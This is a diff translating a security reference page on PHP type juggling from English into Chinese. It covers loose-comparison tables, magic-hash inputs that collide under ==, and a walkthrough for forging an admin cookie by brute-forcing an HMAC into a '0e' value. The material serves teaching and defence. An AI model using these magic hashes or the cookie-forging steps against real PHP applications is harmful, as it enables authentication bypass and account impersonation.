@@ -1,28 +1,30 @@
-# Type Juggling
+[原文文档](README.en.md)
 
-> PHP is a loosely typed language, which means it tries to predict the programmer's intent and automatically converts variables to different types whenever it seems necessary. For example, a string containing only numbers can be treated as an integer or a float. However, this automatic conversion (or type juggling) can lead to unexpected results, especially when comparing variables using the '==' operator, which only checks for value equality (loose comparison), not type and value equality (strict comparison).
+# 类型篡改
 
-## Summary
+> PHP 是一种弱类型语言，这意味着它试图预测程序员的意图，并在必要时自动将变量转换为不同的类型。例如，只包含数字的字符串可以被视为整数或浮点数。然而，这种自动转换（或类型篡改）可能导致意外结果，特别是在使用 '==' 运算符比较变量时，它只检查值相等性（松散比较），而不检查类型和值相等性（严格比较）。
 
-* [Loose Comparison](#loose-comparison)
-    * [True Statements](#true-statements)
-    * [NULL Statements](#null-statements)
-    * [Loose Comparison](#loose-comparison)
-* [Magic Hashes](#magic-hashes)
-* [Methodology](#methodology)
-* [Labs](#labs)
-* [References](#references)
+## 概述
 
-## Loose Comparison
+* [松散比较](#松散比较)
+    * [True 语句](#true-语句)
+    * [NULL 语句](#null-语句)
+    * [松散比较](#松散比较)
+* [魔法哈希](#魔法哈希)
+* [方法论](#方法论)
+* [实验室](#实验室)
+* [参考文献](#参考文献)
 
-> PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs.
+## 松散比较
 
-* **Loose** comparison: using `== or !=` : both variables have "the same value".
-* **Strict** comparison: using `=== or !==` : both variables have "the same type and the same value".
+> 当在攻击者可以控制被比较变量之一的区域中使用松散比较（== 或 !=）而不是严格比较（=== 或 !==）时，就会出现 PHP 类型篡改漏洞。此漏洞可能导致应用程序对真或假语句返回意外答案，并可能导致严重的授权和/或身份验证错误。
 
-### True Statements
+* **松散**比较：使用 `== 或 !=` ：两个变量具有"相同的值"。
+* **严格**比较：使用 `=== 或 !==` ：两个变量具有"相同的类型和相同的值"。
 
-| Statement                         | Output |
+### True 语句
+
+| 语句                         | 输出 |
 | --------------------------------- |:---------------:|
 | `'0010e2'   == '1e3'`             | true |
 | `'0xABCdef' == ' 0xABCdef'`       | true (PHP 5.0) / false (PHP 7.0) |
@@ -38,11 +40,11 @@
 | `false == NULL`                   | true |
 | `NULL == ''`                      | true |
 
-> PHP8 won't try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like `0 == strcmp($_GET['username'], $password)` bypasses, since strcmp won't return null and spit a warning any longer, but will throw a proper exception instead.
+> 由于更合理的字符串到数字比较 RFC，PHP8 不会再尝试将字符串转换为数字，这意味着以 0e 开头的哈希碰撞之类的问题终于成为过去！内部函数的一致类型错误 RFC 将防止类似 `0 == strcmp($_GET['username'], $password)` 绕过的情况，因为 strcmp 不会再返回 null 并发出警告，而是会抛出适当的异常。
 
 ![LooseTypeComparison](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/Images/table_representing_behavior_of_PHP_with_loose_type_comparisons.png?raw=true)
 
-Loose Type comparisons occurs in many languages:
+松散类型比较出现在许多语言中：
 
 * [MariaDB](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mariadb)
 * [MySQL](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mysql)
@@ -53,18 +55,18 @@ Loose Type comparisons occurs in many languages:
 * [Python](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Python)
 * [SQLite](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/SQLite/2.6.0)
 
-### NULL Statements
+### NULL 语句
 
-| Function | Statement                  | Output |
+| 函数 | 语句                  | 输出 |
 | -------- | -------------------------- |:---------------:|
 | sha1     | `var_dump(sha1([]));`      | NULL |
 | md5      | `var_dump(md5([]));`       | NULL |
 
-## Magic Hashes
+## 魔法哈希
 
-> Magic hashes arise due to a quirk in PHP's type juggling, when comparing string hashes to integers. If a string hash starts with "0e" followed by only numbers, PHP interprets this as scientific notation and the hash is treated as a float in comparison operations.
+> 魔法哈希是由于 PHP 类型篡改的一个怪癖而产生的，当将字符串哈希与整数进行比较时。如果字符串哈希以"0e"开头后面只跟数字，PHP 将其解释为科学记数法，在比较操作中该哈希被视为浮点数。
 
-| Hash | "Magic" Number / String    | Magic Hash                                    | Found By / Description      |
+| 哈希 | "魔法"数字/字符串    | 魔法哈希                                    | 发现者/描述      |
 | ---- | -------------------------- | --------------------------------------------- | -------------|
 | MD4  | gH0nAdHk                   | 0e096229559581069251163783434175              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
 | MD4  | IiF+hTai                   | 00e90130237707355082822449868597              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
@@ -74,7 +76,7 @@ Loose Type comparisons occurs in many languages:
 | MD5  | 0e215962017                | 0e291242476940776845150308577824              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
 | MD5  | 129581926211651571912466741651878684928                | 06da5430449f8f6f23dfc1276f722738              | Raw: ?T0D??o#??'or'8.N=? |
 
-| Hash | "Magic" Number / String    | Magic Hash                                    | Found By / Description      |
+| 哈希 | "魔法"数字/字符串    | 魔法哈希                                    | 发现者/描述      |
 | ---- | -------------------------- | --------------------------------------------- | -------------|
 | SHA1 | 10932435112                | 0e07766915004133176347055865026311692244      | Michael A. Cleverly, Michele Spagnuolo & Rogdham |
 | SHA-224 | 10885164793773          | 0e281250946775200129471613219196999537878926740638594636 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1138075224010833921) |
@@ -90,14 +92,14 @@ var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
 ?>
 ```
 
-## Methodology
+## 方法论
 
-The vulnerability in the following code lies in the use of a loose comparison (!=) to validate the $cookie['hmac'] against the calculated `$hash`.
+以下代码中的漏洞在于使用松散比较（!=）来验证 $cookie['hmac'] 对计算的 `$hash`。
 
 ```php
 function validate_cookie($cookie,$key){
  $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
- if($cookie['hmac'] != $hash){ // loose comparison
+ if($cookie['hmac'] != $hash){ // 松散比较
   return false;
   
  }
@@ -107,18 +109,18 @@ function validate_cookie($cookie,$key){
 }
 ```
 
-In this case, if an attacker can control the $cookie['hmac'] value and set it to a string like "0", and somehow manipulate the hash_hmac function to return a hash that starts with "0e" followed only by numbers (which is interpreted as zero), the condition $cookie['hmac'] != $hash would evaluate to false, effectively bypassing the HMAC check.
+在这种情况下，如果攻击者可以控制 $cookie['hmac'] 值并将其设置为像"0"这样的字符串，并以某种方式操作 hash_hmac 函数返回以"0e"开头后面只跟数字的哈希（这被解释为零），那么条件 $cookie['hmac'] != $hash 将评估为 false，有效地绕过 HMAC 检查。
 
-We have control over 3 elements in the cookie:
+我们可以控制 cookie 中的3个元素：
 
-* `$username` - username you are targeting, probably "admin"
-* `$expiration` - a UNIX timestamp, must be in the future
-* `$hmac` - the provided hash, "0"
+* `$username` - 您要攻击的用户名，可能是"admin"
+* `$expiration` - 一个 UNIX 时间戳，必须是未来的时间
+* `$hmac` - 提供的哈希，"0"
 
-The exploitation phase is the following:
+利用阶段如下：
 
-* Prepare a malicious cookie: The attacker prepares a cookie with $username set to the user they wish to impersonate (for example, "admin"), `$expiration` set to a future UNIX timestamp, and $hmac set to "0".
-* Brute force the `$expiration` value: The attacker then brute forces different `$expiration` values until the hash_hmac function generates a hash that starts with "0e" and is followed only by numbers. This is a computationally intensive process and might not be feasible depending on the system setup. However, if successful, this step would generate a "zero-like" hash.
+* 准备恶意 cookie：攻击者准备一个 cookie，其中 $username 设置为他们想要冒充的用户（例如，"admin"），`$expiration` 设置为未来的 UNIX 时间戳，$hmac 设置为"0"。
+* 暴力破解 `$expiration` 值：然后攻击者暴力破解不同的 `$expiration` 值，直到 hash_hmac 函数生成以"0e"开头且后面只跟数字的哈希。这是一个计算密集型过程，根据系统设置可能不可行。然而，如果成功，这一步将生成一个"类似零"的哈希。
 
  ```php
  // docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
@@ -134,7 +136,7 @@ The exploitation phase is the following:
  ?>
  ```
 
-* Update the cookie data with the value from the bruteforce: `1539805986 - 0e772967136366835494939987377058`
+* 使用暴力破解的值更新 cookie 数据：`1539805986 - 0e772967136366835494939987377058`
 
  ```php
  $cookie = [
@@ -144,17 +146,17 @@ The exploitation phase is the following:
  ];
  ```
 
-* In this case we assumed the key was a null string : `$key = '';`
+* 在这种情况下，我们假设密钥是空字符串：`$key = '';`
 
-## Labs
+## 实验室
 
-* [Root Me - PHP - Type Juggling](https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling)
-* [Root Me - PHP - Loose Comparison](https://www.root-me.org/en/Challenges/Web-Server/PHP-Loose-Comparison)
+* [Root Me - PHP - 类型篡改](https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling)
+* [Root Me - PHP - 松散比较](https://www.root-me.org/en/Challenges/Web-Server/PHP-Loose-Comparison)
 
-## References
+## 参考文献
 
-* [(Super) Magic Hashes - myst404 (@myst404_) - October 7, 2019](https://offsec.almond.consulting/super-magic-hash.html)
-* [Magic Hashes - Robert Hansen - May 11, 2015](http://web.archive.org/web/20160722013412/https://www.whitehatsec.com/blog/magic-hashes/)
-* [Magic hashes – PHP hash "collisions" - Michal Špaček (@spaze) - May 6, 2015](https://github.com/spaze/hashes)
-* [PHP Magic Tricks: Type Juggling - Chris Smith (@chrismsnz) - August 18, 2020](http://web.archive.org/web/20200818131633/https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
-* [Writing Exploits For Exotic Bug Classes: PHP Type Juggling - Tyler Borland (TurboBorland) - August 17, 2013](http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html)
+* [(超级)魔法哈希 - myst404 (@myst404_) - 2019年10月7日](https://offsec.almond.consulting/super-magic-hash.html)
+* [魔法哈希 - Robert Hansen - 2015年5月11日](http://web.archive.org/web/20160722013412/https://www.whitehatsec.com/blog/magic-hashes/)
+* [魔法哈希 – PHP 哈希"碰撞" - Michal Špaček (@spaze) - 2015年5月6日](https://github.com/spaze/hashes)
+* [PHP 魔术技巧：类型篡改 - Chris Smith (@chrismsnz) - 2020年8月18日](http://web.archive.org/web/20200818131633/https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
+* [为特殊错误类编写漏洞利用：PHP 类型篡改 - Tyler Borland (TurboBorland) - 2013年8月17日](http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html)
